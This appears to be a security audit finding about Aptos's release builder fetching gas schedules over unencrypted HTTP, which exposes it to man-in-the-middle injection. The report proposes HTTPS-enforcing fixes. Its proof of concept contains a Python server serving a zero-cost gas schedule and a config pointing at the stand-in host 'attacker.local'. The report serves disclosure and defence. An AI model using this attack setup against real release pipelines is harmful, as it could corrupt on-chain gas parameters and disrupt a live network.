# Audit Report

## Title
Man-in-the-Middle Vulnerability in Gas Schedule Remote Fetching Due to Missing HTTPS Enforcement

## Summary
The `fetch_gas_schedule()` function in the Aptos release builder accepts HTTP URLs without validation or warning, enabling network attackers to inject malicious gas configurations through man-in-the-middle attacks when operators inadvertently use insecure URLs.

## Finding Description

The `fetch_gas_schedule()` function fetches remote gas schedules using `reqwest::get()` without enforcing HTTPS or validating URL schemes. [1](#0-0) 

The URL deserialization accepts any valid URL scheme including HTTP. [2](#0-1) 

When a `GasScheduleLocator::RemoteFile` is specified with an HTTP URL in the release configuration, an attacker with network-level man-in-the-middle capabilities can:

1. Intercept the plaintext HTTP connection
2. Inject a malicious `GasScheduleV2` structure with manipulated gas parameters
3. The poisoned gas schedule is embedded into governance proposal scripts

The malicious gas schedule could contain:
- Zero gas costs for specific operations (enabling free computation and resource exhaustion)
- Extremely high gas costs (causing effective network denial-of-service)
- Subtly manipulated costs for specific operations (enabling economic exploits or consensus divergence)

This breaks the **Move VM Safety** invariant: "Bytecode execution must respect gas limits and memory constraints" and the **Resource Limits** invariant: "All operations must respect gas, storage, and computational limits."

The gas schedule is used to generate governance proposals [3](#0-2)  which are then applied on-chain through the `gas_schedule::set_for_next_epoch()` or `set_for_next_epoch_check_hash()` functions. [4](#0-3) 

In contrast, other parts of the codebase properly configure reqwest with explicit TLS validation. [5](#0-4) 

## Impact Explanation

This qualifies as **HIGH severity** per Aptos bug bounty criteria:
- **Significant protocol violations**: The gas schedule is a critical consensus parameter that directly affects Move VM execution across all validators
- **Validator node slowdowns**: Manipulated gas costs could cause performance degradation
- **Potential consensus divergence**: If different validators end up with different gas schedules, it could break deterministic execution

While governance voting provides defense-in-depth, subtle manipulations might escape detection if voters trust the proposal source, and the operator generating the proposal may not notice the MITM attack in progress.

## Likelihood Explanation

**Likelihood: Medium to Low**

Required conditions:
1. Operator must specify an HTTP URL in the release configuration (uncommon but possible through misconfiguration or testing scenarios)
2. Attacker must have network-level MITM position between operator and remote server (requires compromised network, DNS hijacking, or rogue proxy)
3. The malicious proposal must pass governance voting (though subtle changes might be missed)

While individual conditions are uncommon, the combination is realistic in scenarios like:
- Development/testing environments using HTTP endpoints that accidentally reach production
- Compromised internal networks
- DNS poisoning or BGP hijacking attacks
- Rogue CDN or proxy infrastructure

The critical nature of gas schedules and the lack of any warning when using HTTP makes this worth addressing.

## Recommendation

**Immediate Fix:**

1. Add URL scheme validation to reject non-HTTPS URLs:

```rust
impl GasScheduleLocator {
    async fn fetch_gas_schedule(&self) -> Result<GasScheduleV2> {
        println!("{:?}", self);
        match self {
            GasScheduleLocator::LocalFile(path) => {
                let file_contents = fs::read_to_string(path)?;
                let gas_schedule: GasScheduleV2 = serde_json::from_str(&file_contents)?;
                Ok(gas_schedule)
            },
            GasScheduleLocator::RemoteFile(url) => {
                // Enforce HTTPS
                if url.scheme() != "https" {
                    bail!("Remote gas schedule URLs must use HTTPS. Refusing to fetch from insecure URL: {}", url);
                }
                
                // Use explicit TLS configuration
                let client = reqwest::ClientBuilder::default()
                    .tls_built_in_root_certs(true)
                    .build()?;
                    
                let response = client.get(url.as_str()).send().await?;
                let gas_schedule: GasScheduleV2 = response.json().await?;
                Ok(gas_schedule)
            },
            GasScheduleLocator::Current => Ok(aptos_gas_schedule_updator::current_gas_schedule(
                LATEST_GAS_FEATURE_VERSION,
            )),
        }
    }
}
```

2. Add validation during deserialization to warn about HTTP URLs:

```rust
fn visit_str<E>(self, value: &str) -> Result<GasScheduleLocator, E>
where
    E: serde::de::Error,
{
    if value == "current" {
        Ok(GasScheduleLocator::Current)
    } else if let Ok(url) = Url::parse(value) {
        if url.scheme() != "https" {
            return Err(E::custom(format!(
                "Remote URLs must use HTTPS for security. Got: {}",
                url.scheme()
            )));
        }
        Ok(GasScheduleLocator::RemoteFile(url))
    } else {
        Ok(GasScheduleLocator::LocalFile(value.to_string()))
    }
}
```

## Proof of Concept

**Setup:**
1. Create a malicious HTTP server that serves a poisoned gas schedule
2. Create a release configuration with an HTTP URL
3. Run the release builder tool
4. Observe that the malicious gas schedule is fetched without warning

**Malicious Server (Python):**
```python
from http.server import HTTPServer, BaseHTTPRequestHandler
import json

class MaliciousHandler(BaseHTTPRequestHandler):
    def do_GET(self):
        # Return gas schedule with zero costs
        malicious_schedule = {
            "feature_version": 12,
            "entries": [
                ["txn.gas_unit_price", 0],  # Free transactions!
                ["move.instr.call.base", 0],  # Free function calls!
                # ... more zero-cost entries
            ]
        }
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(malicious_schedule).encode())

HTTPServer(('', 8080), MaliciousHandler).serve_forever()
```

**Release Configuration (YAML):**
```yaml
name: "test-release"
remote_endpoint: ~
proposals:
  - name: malicious_gas
    metadata:
      title: "Gas Schedule Update"
      description: "Update gas schedule"
    execution_mode: MultiStep
    update_sequence:
      - Gas:
          old: current
          new: "http://attacker.local:8080/gas_schedule.json"  # HTTP!
```

**Execution:**
```bash
# Run the release builder
cargo run --bin aptos-release-builder -- \
  --config malicious_config.yaml \
  --output /tmp/proposals

# Observe: The tool fetches from HTTP without warning
# Result: Governance proposal contains malicious gas schedule
```

**Expected vs Actual Behavior:**
- **Expected**: Tool rejects HTTP URLs or warns loudly
- **Actual**: Tool silently accepts HTTP and fetches malicious data

## Notes

This vulnerability demonstrates a **defense-in-depth failure**. While governance voting provides a security boundary, the release builder tool should prevent obviously insecure configurations at the earliest stage. The gas schedule is too critical to allow insecure fetching even in a client-side tool used by trusted operators.

### Citations

**File:** aptos-move/aptos-release-builder/src/components/mod.rs (L178-189)
```rust
            fn visit_str<E>(self, value: &str) -> Result<GasScheduleLocator, E>
            where
                E: serde::de::Error,
            {
                if value == "current" {
                    Ok(GasScheduleLocator::Current)
                } else if let Ok(url) = Url::parse(value) {
                    Ok(GasScheduleLocator::RemoteFile(url))
                } else {
                    Ok(GasScheduleLocator::LocalFile(value.to_string()))
                }
            }
```

**File:** aptos-move/aptos-release-builder/src/components/mod.rs (L205-209)
```rust
            GasScheduleLocator::RemoteFile(url) => {
                let response = reqwest::get(url.as_str()).await?;
                let gas_schedule: GasScheduleV2 = response.json().await?;
                Ok(gas_schedule)
            },
```

**File:** aptos-move/aptos-release-builder/src/components/mod.rs (L244-290)
```rust
            ReleaseEntry::Gas { old, new } => {
                let new_gas_schedule = new
                    .fetch_gas_schedule()
                    .await
                    .map_err(|err| anyhow!("Failed to fetch new gas schedule: {}", err))?;
                let old_gas_schedule = match old {
                    Some(old) => Some(
                        old.fetch_gas_schedule()
                            .await
                            .map_err(|err| anyhow!("Failed to fetch old gas schedule: {}", err))?,
                    ),
                    None => {
                        match client {
                            Some(_client) => {
                                // We could return `Some(fetch_config::<GasScheduleV2>(client)?)`,
                                // but this makes certain test scenarios flaky, so just return
                                // None here
                                None
                            },
                            None => {
                                println!("!!! WARNING !!!");
                                println!("Generating gas schedule upgrade without a base for comparison.");
                                println!("It is strongly recommended you specify an old gas schedule or a remote end point where it can be fetched.");
                                println!("!!! WARNING !!!");
                                None
                            },
                        }
                    },
                };

                if old_gas_schedule
                    .as_ref()
                    .map(|old| old != &new_gas_schedule)
                    .unwrap_or(true)
                {
                    result.append(&mut gas::generate_gas_upgrade_proposal(
                        old_gas_schedule.as_ref(),
                        &new_gas_schedule,
                        is_testnet,
                        if is_multi_step {
                            get_execution_hash(result)
                        } else {
                            None
                        },
                        is_multi_step,
                    )?);
                }
```

**File:** aptos-move/framework/aptos-framework/sources/configs/gas_schedule.move (L91-132)
```text
    public fun set_for_next_epoch(aptos_framework: &signer, gas_schedule_blob: vector<u8>) acquires GasScheduleV2 {
        system_addresses::assert_aptos_framework(aptos_framework);
        assert!(!vector::is_empty(&gas_schedule_blob), error::invalid_argument(EINVALID_GAS_SCHEDULE));
        let new_gas_schedule: GasScheduleV2 = from_bytes(gas_schedule_blob);
        if (exists<GasScheduleV2>(@aptos_framework)) {
            let cur_gas_schedule = borrow_global<GasScheduleV2>(@aptos_framework);
            assert!(
                new_gas_schedule.feature_version >= cur_gas_schedule.feature_version,
                error::invalid_argument(EINVALID_GAS_FEATURE_VERSION)
            );
        };
        config_buffer::upsert(new_gas_schedule);
    }

    /// Set the gas schedule for the next epoch, typically called by on-chain governance.
    /// Abort if the version of the given schedule is lower than the current version.
    /// Require a hash of the old gas schedule to be provided and will abort if the hashes mismatch.
    public fun set_for_next_epoch_check_hash(
        aptos_framework: &signer,
        old_gas_schedule_hash: vector<u8>,
        new_gas_schedule_blob: vector<u8>
    ) acquires GasScheduleV2 {
        system_addresses::assert_aptos_framework(aptos_framework);
        assert!(!vector::is_empty(&new_gas_schedule_blob), error::invalid_argument(EINVALID_GAS_SCHEDULE));

        let new_gas_schedule: GasScheduleV2 = from_bytes(new_gas_schedule_blob);
        if (exists<GasScheduleV2>(@aptos_framework)) {
            let cur_gas_schedule = borrow_global<GasScheduleV2>(@aptos_framework);
            assert!(
                new_gas_schedule.feature_version >= cur_gas_schedule.feature_version,
                error::invalid_argument(EINVALID_GAS_FEATURE_VERSION)
            );
            let cur_gas_schedule_bytes = bcs::to_bytes(cur_gas_schedule);
            let cur_gas_schedule_hash = aptos_hash::sha3_512(cur_gas_schedule_bytes);
            assert!(
                cur_gas_schedule_hash == old_gas_schedule_hash,
                error::invalid_argument(EINVALID_GAS_SCHEDULE_HASH)
            );
        };

        config_buffer::upsert(new_gas_schedule);
    }
```

**File:** crates/aptos/src/governance/mod.rs (L421-425)
```rust
async fn get_metadata_from_url(metadata_url: &Url) -> CliTypedResult<Vec<u8>> {
    let client = reqwest::ClientBuilder::default()
        .tls_built_in_root_certs(true)
        .build()
        .map_err(|err| CliError::UnexpectedError(format!("Failed to build HTTP client {}", err)))?;
```
